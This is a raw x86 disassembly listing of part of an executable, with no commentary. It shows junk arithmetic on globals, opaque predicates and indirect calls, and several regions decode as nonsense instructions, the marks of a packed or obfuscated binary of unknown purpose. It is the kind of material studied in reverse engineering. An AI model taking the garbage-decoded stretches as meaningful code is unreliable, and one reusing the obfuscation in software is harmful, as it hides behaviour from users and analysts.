  417c36:	sbb    esi,DWORD PTR [ecx+edi*1-0x42]
  417c3a:	cli    
  417c3b:	nop
  417c3c:	addr16 fcmovu st,st(6)
  417c3f:	scas   eax,DWORD PTR es:[edi]
  417c40:	iret   
  417c41:	or     BYTE PTR [edi],0x6
  417c44:	scas   al,BYTE PTR es:[edi]
  417c45:	mov    edx,0x4fb93cfc
  417c4a:	sub    dl,ch
  417c4c:	xor    al,0x71
  417c4e:	outs   dx,DWORD PTR ds:[esi]
  417c4f:	mov    WORD PTR [eax],cs
  417c51:	mov    BYTE PTR [eax+eiz*2+0x9],cl
  417c55:	sar    BYTE PTR [edi+0x31],cl
  417c58:	add    DWORD PTR [eax+0x5f],ebx
  417c5b:	leave  
  417c5c:	dec    edi
  417c5d:	push   ebx
  417c5e:	sub    al,0xf3
  417c60:	xchg   esp,eax
  417c61:	mov    DWORD PTR [esp+0x1c],esi
  417c65:	add    DWORD PTR ds:0x428425,0x4dd4
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42856d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x42842d,0x42846d
  417c89:	push   0x4
  417c8b:	push   0x42257c
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x42843d,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x4284cd,0x0
  417cb2:	mov    DWORD PTR ds:0x428561,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x42843d,0x3679
  417cd7:	cmp    DWORD PTR ds:0x4284cd,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x4284e5
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x42853d
  417d00:	and    DWORD PTR ds:0x42834d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x42832d
  417d10:	and    DWORD PTR ds:0x42831d,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x428411
  417d1e:	mov    edx,DWORD PTR ds:0x428485
  417d24:	mov    ebx,DWORD PTR ds:0x428501
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x428325,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x4284bd,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428349,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x42843d,edi
  417d61:	cmp    DWORD PTR ds:0x428325,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428341
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428455,ecx
  417d87:	mov    DWORD PTR ds:0x4284e1,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428559
  417d97:	adc    DWORD PTR ds:0x4284e9,0x890
  417da1:	xor    DWORD PTR ds:0x428355,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x42831d
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417e0e
  417ddf:	daa    
  417de0:	cmp    dl,BYTE PTR [edx-0x413f1915]
  417de6:	xor    eax,0x4fbebec2
  417deb:	push   ebx
  417dec:	mov    edx,0x34450edc
  417df1:	xchg   edi,eax
  417df2:	cmp    ecx,esp
  417df4:	mov    ah,0x31
  417df6:	push   esi
  417df7:	ffree  st(4)
  417df9:	cld    
  417dfa:	fcom   DWORD PTR [eax-0x557ee047]
  417e00:	xchg   DWORD PTR [eax+0x62],edx
  417e03:	xor    DWORD PTR [ecx+0x51],0x858bce8
  417e0a:	adc    BYTE PTR [ebx+0x34e657f0],ah
  417e10:	xchg   esp,eax
  417e11:	or     al,0xc7
  417e13:	retf   0x234a
  417e16:	daa    
  417e17:	ja     0x417db4
  417e19:	jl     0x417e2f
  417e1b:	data16 daa 
  417e1d:	nop
  417e1e:	xchg   edi,eax
  417e1f:	jg     0x417df4
  417e21:	neg    edx
  417e23:	mov    ds:0x5def329c,al
  417e28:	mov    al,0xcd
  417e2a:	jmp    0x6dc301a6
  417e2f:	jg     0x417e47
  417e31:	(bad)  
  417e34:	dec    ebp
  417e35:	or     al,0x6b
  417e37:	pusha  
  417e38:	jae    0x417dfe
  417e3a:	and    edx,edx
  417e3c:	mov    esp,ss
  417e3e:	mov    BYTE PTR [edi+0x41],ch
  417e41:	fwait
  417e42:	xlat   BYTE PTR ds:[ebx]
  417e43:	cmp    eax,DWORD PTR [esi]
  417e45:	lods   eax,DWORD PTR ds:[esi]
  417e46:	push   edx
  417e47:	xchg   edi,eax
  417e48:	sbb    eax,0x48a9d030
  417e4d:	and    ch,ch
  417e4f:	mov    al,0x5a
  417e51:	dec    ecx
  417e52:	fneni(8087 only) 
  417e54:	iret   
  417e55:	inc    eax
  417e56:	jle    0x417ecd
  417e58:	inc    esp
  417e59:	inc    eax
  417e5a:	data16 xchg BYTE PTR [esp+edx*4+0x2c],cl
  417e5f:	lock rcr BYTE PTR [ebx],1
  417e62:	int3   
  417e63:	repz (bad) 
  417e65:	aad    0x69
  417e67:	xchg   ecx,eax
  417e68:	jb     0x417e03
  417e6a:	sbb    dh,BYTE PTR [esi+ebp*2]
  417e6d:	sub    ebp,DWORD PTR [esi*4-0x18059f08]
  417e74:	out    dx,eax
  417e75:	cs jl  0x417e2c
  417e78:	xchg   BYTE PTR ds:0x9cd44c4a,bl
  417e7e:	dec    edi
  417e7f:	dec    edi
  417e80:	jle    0x417e77
  417e82:	push   edi
  417e83:	fdivr  DWORD PTR [ecx]
  417e85:	ret    0xd860
  417e88:	xor    eax,0xa383bfbc
  417e8d:	or     eax,0x58e60dab
  417e92:	pinsrw mm3,WORD PTR [esi+0x78],0xf1
  417e97:	imul   DWORD PTR [ecx+0x29b73586]
  417e9d:	jbe    0x417ec8
  417e9f:	cmp    ch,bl
  417ea1:	int3   
  417ea2:	jno    0x417e6a
  417ea4:	outs   dx,DWORD PTR ds:[esi]
  417ea5:	mov    esi,0xbcfc77f2
  417eaa:	lock js 0x417f2b
  417ead:	and    DWORD PTR [ebx+0x78],0x22
  417eb1:	push   edx
  417eb2:	in     eax,dx
  417eb3:	imul   esp,DWORD PTR [edx-0x47],0xc5fe9611
  417eba:	repnz (bad) 
  417ebc:	aam    0xd8
  417ebe:	dec    ebx
  417ebf:	int3   
  417ec0:	pushf  
  417ec1:	xchg   esp,eax
  417ec2:	pop    esp
  417ec3:	imul   edx,DWORD PTR [edx],0xfffffff9
  417ec6:	push   cs
  417ec7:	and    eax,ecx
  417ec9:	shl    DWORD PTR [edx+0x34],1
  417ecc:	add    eax,0x688f2aef
  417ed1:	jnp    0x417f0e
  417ed3:	aaa    
  417ed4:	(bad)  
  417ed5:	shr    DWORD PTR [ebx+0x54],1
  417ed8:	push   ebp
  417ed9:	stc    
  417eda:	enter  0x7893,0xe3
  417ede:	inc    ecx
  417edf:	test   BYTE PTR [ecx+0x31],cl
  417ee2:	or     BYTE PTR [ebp-0x55503c2c],dl
  417ee8:	scas   eax,DWORD PTR es:[edi]
  417ee9:	test   eax,0x502086d7
  417eee:	mov    DWORD PTR [edi-0x4e],ebx
  417ef1:	fnstenv [eax-0x13]
  417ef4:	mov    ds,WORD PTR [edi-0x4a]
  417ef7:	leave  
  417ef8:	outs   dx,BYTE PTR ds:[esi]
  417ef9:	popf   
  417efa:	(bad)  
  417efb:	fisub  DWORD PTR [ecx]
  417efd:	daa    
  417efe:	xor    edi,DWORD PTR [edx+edx*1]
  417f01:	pop    edx
  417f03:	pushf  
  417f04:	pop    edx
  417f05:	or     eax,ecx
  417f07:	inc    eax
  417f08:	or     BYTE PTR [ebx+0x122d366],bh
  417f0e:	fstp   DWORD PTR ds:0x28bfd4ca
  417f14:	ror    DWORD PTR [edi-0x7ba4a0af],0xae
  417f1b:	xchg   ecx,eax
  417f1c:	retf   
  417f1d:	push   ebp
  417f1e:	jp     0x417ea4
  417f20:	cdq    
  417f21:	sub    ah,BYTE PTR [edi]
  417f23:	sbb    al,0xc6
  417f25:	stc    
  417f26:	pop    esi
  417f27:	pop    ds
  417f28:	pusha  
  417f29:	call   0x46f01a60
  417f2e:	es push ebx
  417f30:	fistp  QWORD PTR [edx-0x6e91507c]
  417f36:	pop    esi
  417f37:	jge    0x417f46
  417f39:	iret   
  417f3a:	mov    bh,0x56
  417f3c:	xchg   esi,eax
  417f3d:	fistp  WORD PTR [ebx]
  417f3f:	jge    0x417edb
  417f41:	imul   ah
  417f43:	sbb    eax,0x3df61ee5
  417f48:	adc    al,0xaf
  417f4a:	pop    esp
  417f4b:	push   edi
  417f4c:	adc    DWORD PTR [ecx-0x15],ebx
  417f4f:	out    dx,al
  417f50:	aas    
  417f51:	ins    DWORD PTR es:[edi],dx
  417f52:	xor    al,dl
  417f54:	push   eax
  417f55:	inc    edi
  417f56:	mov    gs,WORD PTR [eax+0x51]
  417f59:	ds inc eax
  417f5b:	iret   
  417f5c:	inc    ebp
  417f5d:	and    esi,DWORD PTR [ebx+esi*4]
  417f60:	(bad)  
  417f62:	fidiv  WORD PTR [ebx+0x11]
  417f65:	and    ecx,ecx
  417f67:	mov    ch,0x1e
  417f69:	and    eax,0xa86568d2
  417f6e:	sub    DWORD PTR [ecx+0x3ff506b1],ecx
  417f74:	ret    
  417f75:	leave  
  417f76:	jmp    DWORD PTR [ebx+ecx*4]
  417f7a:	sbb    bh,0x67
  417f7d:	mov    ah,0x24
  417f7f:	jne    0x417fad
  417f81:	mov    ecx,0xf57f2e4b
  417f86:	js     0x417fca
  417f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f89:	mov    DWORD PTR [ebx-0x34],esp
  417f8c:	loopne 0x417f8e
  417f8e:	data16 icebp 
  417f90:	xchg   DWORD PTR [edi+0x23],ebx
  417f93:	test   BYTE PTR [eax-0x50c35abf],bl
  417f99:	jo     0x418015
  417f9b:	push   ds
  417f9c:	or     eax,0x6f1df4b6
  417fa1:	or     ch,BYTE PTR [edi-0x20c0cf70]
  417fa7:	mov    edi,0x18f3bb7b
  417fac:	fld    DWORD PTR [ebx+0x74124b6c]
  417fb2:	sbb    ah,BYTE PTR [ebp-0x74]
  417fb5:	ret    
  417fb6:	ret    0x6aba
  417fb9:	loopne 0x418014
  417fbb:	mov    ebp,0x7184c17f
  417fc0:	scas   eax,DWORD PTR es:[edi]
  417fc1:	sti    
  417fc2:	data16 cmp BYTE PTR [eax+0x4675cfa1],bl
  417fc9:	out    dx,al
  417fca:	dec    edx
  417fcb:	sub    ebp,0x97ef09ac
  417fd1:	jmp    0x735f1440
  417fd6:	cli    
  417fd7:	xor    DWORD PTR ds:0x468045db,eax
  417fdd:	sti    
  417fde:	push   ss
  417fdf:	xchg   esp,eax
  417fe0:	addr16 dec ebx
  417fe2:	ficomp WORD PTR [edi-0x515ca671]
  417fe8:	sub    ebp,esp
  417fea:	pop    esi
  417feb:	retf   0xc2e3
  417fee:	rcr    DWORD PTR [edx+0x1],1
  417ff1:	ret    0x31d1
  417ff4:	(bad)  
  417ff5:	sub    DWORD PTR [eax+0x13a57689],edx
  417ffb:	pop    ebp
  417ffc:	add    bh,ch
  417ffe:	loopne 0x417ff7
  418000:	adc    dl,BYTE PTR [esi-0x1]
  418003:	jnp    0x418043
  418005:	(bad)  
  418006:	adc    al,0xc3
  418008:	inc    esp
  418009:	jno    0x417fe1
  41800b:	jmp    0x418064
  41800d:	mov    esp,0xa142e73
  418012:	push   0x1
  418014:	dec    edx
  418015:	rcl    BYTE PTR [ecx],1
  418017:	pop    esi
  418018:	not    BYTE PTR [esi]
  41801a:	inc    ebp
  41801b:	inc    ebp
  41801c:	pop    ss
  41801d:	popf   
  41801e:	cmp    ecx,DWORD PTR [ecx-0x7b]
  418021:	or     DWORD PTR [edi+0x64280f3d],edx
  418027:	call   0x9824:0x848dc0a8
  41802e:	add    BYTE PTR [eax],al
  418030:	add    BYTE PTR [ebx+0x42844d3d],al
  418036:	add    BYTE PTR [eax],al
  418038:	mov    DWORD PTR ds:0x428325,0x1551
  418042:	mov    DWORD PTR ds:0x428535,0x780e
  41804c:	mov    DWORD PTR ds:0x428329,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x428331,edx
  418061:	mov    DWORD PTR ds:0x42832d,0x4140
  41806b:	cmp    DWORD PTR ds:0x42844d,0x0
  418072:	je     0x4180ae
  418078:	push   0x4281e1
  41807d:	push   0x428147
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428485
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x42852d
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x4283f5
  4180a1:	adc    DWORD PTR ds:0x4284f1,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x42843d,edi
  4180ae:	adc    DWORD PTR ds:0x4284c9,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x4283a1
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x428415,ebx
  4180c4:	xor    DWORD PTR ds:0x4284d9,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428455,0x0
  4180d5:	mov    DWORD PTR ds:0x42843d,edx
  4180db:	mov    edx,DWORD PTR ds:0x4284cd
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42856d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428455,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x428401
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428359,ecx
  41810f:	adc    DWORD PTR ds:0x428539,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428465
  418121:	mov    edx,DWORD PTR ds:0x428379
  418127:	mov    ebx,DWORD PTR ds:0x428501
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x428539
  418138:	mov    ebx,DWORD PTR ds:0x4283a9
  41813e:	mov    ecx,DWORD PTR ds:0x4285a9
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428441,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42856d
  418164:	sub    DWORD PTR ds:0x42844d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428565,0x0
  418174:	mov    DWORD PTR ds:0x4284cd,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428565,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428465,ebx
  4181b3:	add    DWORD PTR ds:0x428569,0x428431
  4181bd:	mov    ebx,DWORD PTR ds:0x428551
  4181c3:	sbb    ebx,DWORD PTR ds:0x4283f9
  4181c9:	mov    DWORD PTR ds:0x428551,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x42839d
  4181d5:	mov    ebx,DWORD PTR ds:0x428519
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x42831d
  4181e6:	and    ebx,DWORD PTR ds:0x428419
  4181ec:	mov    DWORD PTR ds:0x42831d,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42854d,0x0
  418207:	mov    DWORD PTR ds:0x4284d5,0x564a
  418211:	mov    DWORD PTR ds:0x428455,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42854d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428449
  418252:	adc    DWORD PTR ds:0x42855d,ecx
  418258:	xor    DWORD PTR ds:0x428335,0x4309
  418262:	sub    DWORD PTR ds:0x428365,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	dec    ebx
  41827e:	lahf   
  41827f:	mov    WORD PTR [esp+eiz*2+0x35bec0ea],fs
  418286:	ret    0xbebe
  418289:	and    BYTE PTR [ecx-0xc],dh
  41828c:	xchg   ecx,eax
  41828d:	mov    ds:0x399b66dc,eax
  418292:	jo     0x43d56436
  418298:	(bad)  
  418299:	mov    edi,0xd6fd6385
  41829e:	jnp    0x418234
  4182a0:	adc    eax,0x433f1b4e
  4182a5:	and    al,BYTE PTR [esi]
  4182a7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4182a9:	and    BYTE PTR [edx+ebp*4],al
  4182ac:	iret   
  4182ad:	rcr    DWORD PTR [eax+0x4a],cl
  4182b0:	mov    ebp,0x31d2f256
  4182b5:	mov    ss,WORD PTR [eax+0x11276eb5]
  4182bb:	mov    bh,0x8f
  4182bd:	adc    al,0x77
  4182bf:	nop
  4182c0:	jmp    0x3eaf6892
  4182c5:	sub    edi,DWORD PTR [esi]
  4182c7:	pop    ss
  4182c8:	out    dx,eax
  4182c9:	repnz movs DWORD PTR es:[di],DWORD PTR ds:[si]
  4182cc:	or     DWORD PTR [eiz*4-0x12b0045c],ecx
  4182d3:	push   edx
  4182d4:	push   esi
  4182d5:	not    WORD PTR ds:0x4a0ea0a8
  4182dc:	xchg   BYTE PTR [edi+0x62],dl
  4182df:	xchg   ch,dh
  4182e1:	rcl    BYTE PTR [edx-0x7e],1
  4182e4:	ret    0x3d5d
  4182e7:	data16 ror BYTE PTR [edx],1
  4182ea:	mov    cl,0x95
  4182ec:	push   ebp
  4182ed:	int    0xa3
  4182ef:	stos   DWORD PTR es:[edi],eax
  4182f0:	mov    eax,0x847f39e6
  4182f5:	mov    bl,0xf6
  4182f7:	push   eax
  4182f8:	in     al,0x2
  4182fa:	jecxz  0x4182a3
  4182fc:	add    BYTE PTR [esi-0x7b],cl
  4182ff:	mov    ch,0x51
  418301:	retf   
  418302:	pop    ds
  418303:	xchg   DWORD PTR [ebx+0x4bb98cde],eax
  418309:	xchg   ebx,eax
  41830a:	jbe    0x418386
  41830c:	lods   eax,DWORD PTR ds:[esi]
  41830d:	lea    ebx,[edi]
  41830f:	mov    dl,0x99
  418311:	mov    bh,0x1d
  418313:	inc    eax
  418314:	test   al,0xb6
  418316:	leave  
  418317:	pop    esp
  418318:	test   al,0xf
  41831a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41831b:	iret   
  41831c:	scas   eax,DWORD PTR es:[edi]
  41831d:	xchg   DWORD PTR [ebx-0x72318f8a],ecx
  418323:	dec    edi
  418324:	aaa    
  418325:	inc    edi
  418326:	jge    0x418370
  418328:	popa   
  418329:	cld    
  41832a:	jle    0x41834a
  41832c:	ins    DWORD PTR es:[edi],dx
  41832d:	pop    ss
  41832e:	jle    0x4182e0
  418330:	jne    0x4182cd
  418332:	push   ds
  418333:	jl     0x418350
  418335:	push   ds
  418336:	inc    edi
  418337:	stos   BYTE PTR es:[edi],al
  418338:	bound  edi,QWORD PTR [eax]
  41833a:	push   edx
  41833b:	mov    DWORD PTR [edi],edi
  41833d:	(bad)  
  41833e:	jge    0x41835b
  418340:	sub    BYTE PTR [ebx+ecx*8+0x77881146],ah
  418347:	ret    
  418348:	xchg   esi,eax
  418349:	pop    eax
  41834a:	jmp    0x7fd108b9
  41834f:	ja     0x41839e
  418351:	mov    eax,0x456b9484
  418356:	out    dx,al
  418357:	je     0x4183d7
  418359:	retf   0x142f
  41835c:	mov    al,0xc7
  41835e:	aas    
  41835f:	cli    
  418360:	jecxz  0x4182f0
  418362:	pop    eax
  418363:	ins    BYTE PTR es:[edi],dx
  418364:	push   esp
  418365:	sti    
  418366:	adc    al,0xe0
  418368:	jo     0x8db50227
  41836e:	rcr    DWORD PTR [edi+0xc7e6c34],0xfa
  418375:	daa    
  418376:	ret    0xed9e
  418379:	daa    
  41837a:	pop    ecx
  41837b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41837c:	dec    edx
  41837d:	pop    ss
  41837e:	sbb    BYTE PTR [edi-0x33],cl
  418381:	std    
  418382:	loop   0x418343
  418384:	(bad)  
  418385:	push   edi
  418386:	cmp    DWORD PTR [ecx-0x6b2ae84a],esi
  41838c:	xlat   BYTE PTR ds:[ebx]
  41838d:	dec    ebp
  41838e:	push   esi
  41838f:	xchg   al,al
  418391:	adc    edx,DWORD PTR [ebx+0x6059f505]
  418397:	mov    eax,0x2b5cbcba
  41839c:	aad    0x5b
  41839e:	out    dx,al
  41839f:	(bad)  
  4183a0:	repnz cmp BYTE PTR [ecx],0x9a
  4183a4:	shr    DWORD PTR [edi-0x5a03a01],0x73
  4183ab:	pop    edi
  4183ac:	or     al,0xa
  4183ae:	jecxz  0x4183f9
  4183b0:	icebp  
  4183b1:	pop    eax
  4183b2:	(bad)  [esi]
  4183b4:	lahf   
  4183b5:	shl    dh,cl
  4183b7:	or     esi,eax
  4183b9:	and    BYTE PTR [ebp-0x51],bh
  4183bc:	test   al,0x1f
  4183be:	and    eax,0x55d615ef
  4183c3:	inc    ebp
  4183c4:	or     DWORD PTR [esi],esp
  4183c6:	scas   al,BYTE PTR es:[edi]
  4183c7:	dec    ebx
  4183c8:	dec    esp
  4183c9:	ss repz gs cs push eax
  4183ce:	lods   eax,DWORD PTR ds:[esi]
  4183cf:	outs   dx,DWORD PTR ds:[esi]
  4183d0:	sub    DWORD PTR [edi-0x51],edx
  4183d3:	call   0x1834e4e
  4183d8:	clc    
  4183d9:	mov    eax,0x2046c185
  4183de:	push   edx
  4183df:	adc    al,0x39
  4183e1:	mov    ecx,ds
  4183e3:	mov    bh,0xe0
  4183e5:	and    DWORD PTR [esi+0x3acd18e6],esp
  4183eb:	mov    ch,0x9e
  4183ed:	add    DWORD PTR [esi+edi*4+0x4a2af67f],edi
  4183f4:	pop    ecx
  4183f5:	lea    ebx,[ecx-0x79]
  4183f8:	xchg   ebp,eax
  4183f9:	add    al,0xd0
  4183fb:	mov    ebx,0xb25ec6f2
  418400:	pop    edi
  418401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418402:	int    0x50
  418404:	jne    0x4183dd
  418406:	or     eax,0x9c77a664
  41840b:	mov    ebx,0xba54d97c
  418410:	and    eax,0xb3e22473
  418415:	mul    DWORD PTR [ebx-0x532d8323]
  41841b:	or     ah,al
  41841d:	jb     0x4183fe
  41841f:	pop    eax
  418420:	repnz stos BYTE PTR es:[edi],al
  418422:	sub    eax,DWORD PTR cs:[ecx]
  418425:	stos   BYTE PTR es:[edi],al
  418426:	stos   DWORD PTR es:[edi],eax
  418427:	xor    BYTE PTR [ebp+0x6020a774],dl
  41842d:	ficomp DWORD PTR [edi]
  41842f:	xchg   ecx,eax
  418430:	cmc    
  418431:	fs mov cl,0x7d
  418434:	add    al,0x53
  418436:	inc    esi
  418437:	jnp    0x4184a3
  418439:	adc    ch,cl
  41843b:	and    DWORD PTR [edi+ebx*4+0x42],edi
  41843f:	fs pushf 
  418441:	mov    eax,0x1cdfe04e
  418446:	mov    eax,DWORD PTR [ebx]
  418448:	aad    0x1f
  41844a:	or     al,0x63
  41844c:	test   bl,bh
  41844e:	sub    eax,0xe5ac1502
  418453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418454:	cmp    DWORD PTR [edi+0x5da3e142],ebp
  41845a:	push   eax
  41845b:	imul   ecx,DWORD PTR [ecx],0xf461da3e
  418461:	push   0xfffffffc
  418463:	in     al,dx
  418464:	and    DWORD PTR [eax],ecx
  418466:	loope  0x4184be
  418468:	in     al,dx
  418469:	xor    ecx,DWORD PTR [esi-0x1c]
  41846c:	fidiv  WORD PTR [eax+0x7935a391]
  418472:	stos   DWORD PTR es:[edi],eax
  418473:	aam    0x9d
  418475:	rcr    DWORD PTR [ecx+0x366b94df],1
  41847b:	test   al,0x13
  41847d:	(bad)  
  41847e:	push   ecx
  41847f:	dec    esi
  418480:	or     BYTE PTR [ebx-0x69],0x50
  418484:	xor    dl,bh
  418486:	xor    al,0x92
  418488:	sbb    BYTE PTR [ebp-0x14b2f16d],ch
  41848e:	scas   eax,DWORD PTR es:[edi]
  41848f:	mov    esi,0xb3c2b711
  418494:	lahf   
  418495:	jle    0x418482
  418497:	dec    edx
  418498:	shld   DWORD PTR [eax+0x1f5b2801],ebx,cl
  41849f:	ds in  al,dx
  4184a1:	cli    
  4184a2:	imul   edx,DWORD PTR [ebx+0x12],0xffffff9c
  4184a6:	cmp    al,0x0
  4184a8:	jmp    0x418447
  4184aa:	jmp    0x418469
  4184ac:	scas   eax,DWORD PTR es:[edi]
  4184ad:	mov    ds:0x1982ccbe,eax
  4184b2:	in     eax,0xa3
  4184b4:	out    0x9f,eax
  4184b6:	jmp    0x125c4650
  4184bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184bc:	sahf   
  4184bd:	js     0x4184d0
  4184bf:	shl    ebp,cl
  4184c1:	mov    eax,ds:0x2488e7d
  4184c6:	into   
  4184c7:	pop    ss
  4184c8:	in     eax,0xc7
  4184ca:	inc    esp
  4184cb:	and    al,0x34
  4184cd:	inc    ebp
  4184ce:	inc    esp
  4184cf:	add    BYTE PTR [eax],al
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
